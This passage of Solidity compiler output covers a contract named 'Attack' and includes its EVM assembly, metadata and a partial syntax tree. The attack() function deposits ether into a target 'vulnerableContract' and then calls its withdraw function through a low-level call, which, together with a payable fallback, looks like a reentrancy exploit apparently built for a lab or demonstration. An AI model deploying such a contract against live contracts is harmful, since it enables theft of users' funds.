										},
										{
											"begin": 359,
											"end": 403,
											"name": "POP"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "MLOAD"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP1"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP4"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "SUB"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP2"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP6"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "DUP8"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "GAS"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "CALL"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "SWAP3"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "POP"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "POP"
										},
										{
											"begin": 359,
											"end": 403,
											"name": "POP"
										},
										{
											"begin": 337,
											"end": 403,
											"name": "SWAP2"
										},
										{
											"begin": 337,
											"end": 403,
											"name": "POP"
										},
										{
											"begin": 422,
											"end": 436,
											"name": "DUP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ISZERO"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ISZERO"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "JUMPI"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MLOAD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MSTORE"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ADD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP1"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP1"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ADD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP3"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "SUB"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP3"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MSTORE"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MSTORE"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ADD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP1"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "4465706F736974206661696C6564000000000000000000000000000000000000"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MSTORE"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "POP"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "ADD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "SWAP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "POP"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "POP"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "MLOAD"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "DUP1"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "SWAP2"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "SUB"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "SWAP1"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "REVERT"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 414,
											"end": 455,
											"name": "JUMPDEST"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "DUP1"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "SLOAD"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "EXP"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "DIV"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 590,
											"end": 608,
											"name": "AND"
										},
										{
											"begin": 590,
											"end": 613,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 590,
											"end": 613,
											"name": "AND"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "MLOAD"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "DUP1"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "DUP1"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "PUSH",
											"value": "77697468647261772875696E7432353629000000000000000000000000000000"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "DUP2"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "MSTORE"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "POP"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "PUSH",
											"value": "11"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "ADD"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "SWAP1"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "POP"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "MLOAD"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "DUP1"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "SWAP2"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "SUB"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "SWAP1"
										},
										{
											"begin": 621,
											"end": 651,
											"name": "KECCAK256"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "SWAP1"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DIV"
										},
										{
											"begin": 654,
											"end": 663,
											"name": "CALLVALUE"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "MLOAD"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP3"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "AND"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "MUL"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP2"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "MSTORE"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "ADD"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP1"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP3"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP2"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "MSTORE"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "ADD"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "SWAP2"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "MLOAD"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP1"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP4"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "SUB"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP2"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "DUP8"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "GAS"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "CALL"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "SWAP3"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 590,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 567,
											"end": 664,
											"name": "SWAP1"
										},
										{
											"begin": 567,
											"end": 664,
											"name": "POP"
										},
										{
											"begin": 683,
											"end": 698,
											"name": "DUP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ISZERO"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ISZERO"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "JUMPI"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MLOAD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MSTORE"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ADD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ADD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP3"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "SUB"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP3"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MSTORE"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MSTORE"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ADD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "5769746864726177206661696C65640000000000000000000000000000000000"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MSTORE"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "POP"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "ADD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "SWAP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "POP"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "POP"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "MLOAD"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "DUP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "SWAP2"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "SUB"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "SWAP1"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "REVERT"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 675,
											"end": 718,
											"name": "JUMPDEST"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "POP"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "POP"
										},
										{
											"begin": 208,
											"end": 726,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"vulnerableContract()": "144166ae"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.24+commit.e67f0147\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":true,\"inputs\":[],\"name\":\"vulnerableContract\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_vulnerableContract\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"Attack.sol\":\"Attack\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"Attack.sol\":{\"keccak256\":\"0xec0a1f72efe86e5f85c97694fd0c3bfc28ff87d5a323e0ade8a899240e0d6a13\",\"urls\":[\"bzzr://0ef7f2c5517c6daef819662451d66b5d5b85000bcd306d2350189c08b6dd0cd8\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"Attack.sol": {
				"ast": {
					"absolutePath": "Attack.sol",
					"exportedSymbols": {
						"Attack": [
							83
						]
					},
					"id": 84,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.4",
								".24"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 83,
							"linearizedBaseContracts": [
								83
							],
							"name": "Attack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 3,
									"name": "vulnerableContract",
									"nodeType": "VariableDeclaration",
									"scope": 83,
									"src": "51:33:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "51:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 12,
										"nodeType": "Block",
										"src": "141:59:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 10,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 8,
														"name": "vulnerableContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "152:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 9,
														"name": "_vulnerableContract",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "173:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "152:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 11,
												"nodeType": "ExpressionStatement",
												"src": "152:40:0"
											}
										]
									},
									"documentation": null,
									"id": 13,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"name": "_vulnerableContract",
												"nodeType": "VariableDeclaration",
												"scope": 13,
												"src": "105:27:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 4,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "105:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "104:29:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "141:0:0"
									},
									"scope": 83,
									"src": "93:107:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 50,
										"nodeType": "Block",
										"src": "241:485:0",
										"statements": [
											{
												"assignments": [
													17
												],
												"declarations": [
													{
														"constant": false,
														"id": 17,
														"name": "depositSuccess",
														"nodeType": "VariableDeclaration",
														"scope": 51,
														"src": "337:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 16,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "337:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 26,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "",
															"id": 24,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "400:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 21,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 98,
																	"src": "389:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 22,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "389:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 18,
																	"name": "vulnerableContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "359:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"id": 19,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "call",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "359:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$",
																	"typeString": "function () payable returns (bool)"
																}
															},
															"id": 20,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "359:29:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_setvalue_nonpayable$_t_uint256_$returns$_t_function_barecall_payable$__$returns$_t_bool_$value_$",
																"typeString": "function (uint256) returns (function () payable returns (bool))"
															}
														},
														"id": 23,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "359:40:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$value",
															"typeString": "function () payable returns (bool)"
														}
													},
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "359:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "337:66:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 28,
															"name": "depositSuccess",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 17,
															"src": "422:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "4465706f736974206661696c6564",
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "438:16:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_1ef3522165fd90e0e1148ebcaaaed21ce8bee4aaa5ab7024953291759483a221",
																"typeString": "literal_string \"Deposit failed\""
															},
															"value": "Deposit failed"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_1ef3522165fd90e0e1148ebcaaaed21ce8bee4aaa5ab7024953291759483a221",
																"typeString": "literal_string \"Deposit failed\""
															}
														],
														"id": 27,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															101,
															102
														],
														"referencedDeclaration": 102,
														"src": "414:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 30,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "414:41:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 31,
												"nodeType": "ExpressionStatement",
												"src": "414:41:0"
											},
											{
												"assignments": [
													33
												],
												"declarations": [
													{
														"constant": false,
														"id": 33,
														"name": "withdrawSuccess",
														"nodeType": "VariableDeclaration",
														"scope": 51,
														"src": "567:20:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 32,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "567:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 44,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "77697468647261772875696e7432353629",
																			"id": 38,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "string",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "631:19:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																				"typeString": "literal_string \"withdraw(uint256)\""
																			},
																			"value": "withdraw(uint256)"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_stringliteral_2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f",
																				"typeString": "literal_string \"withdraw(uint256)\""
																			}
																		],
																		"id": 37,
																		"name": "keccak256",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 92,
																		"src": "621:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_sha3_pure$__$returns$_t_bytes32_$",
																			"typeString": "function () pure returns (bytes32)"
																		}
																	},
																	"id": 39,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "621:30:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																],
																"id": 36,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "614:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_bytes4_$",
																	"typeString": "type(bytes4)"
																},
																"typeName": "bytes4"
															},
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "614:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															}
														},
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 41,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 98,
																"src": "654:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 42,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "654:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 34,
															"name": "vulnerableContract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 3,
															"src": "590:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 35,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "590:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$__$returns$_t_bool_$",
															"typeString": "function () payable returns (bool)"
														}
													},
													"id": 43,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "590:74:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "567:97:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 46,
															"name": "withdrawSuccess",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 33,
															"src": "683:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "5769746864726177206661696c6564",
															"id": 47,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "700:17:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_2bbe70e6500e9642f2862dc923170a5f09b5a43a51b0f2c3488a318564bb6925",
																"typeString": "literal_string \"Withdraw failed\""
															},
															"value": "Withdraw failed"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_2bbe70e6500e9642f2862dc923170a5f09b5a43a51b0f2c3488a318564bb6925",
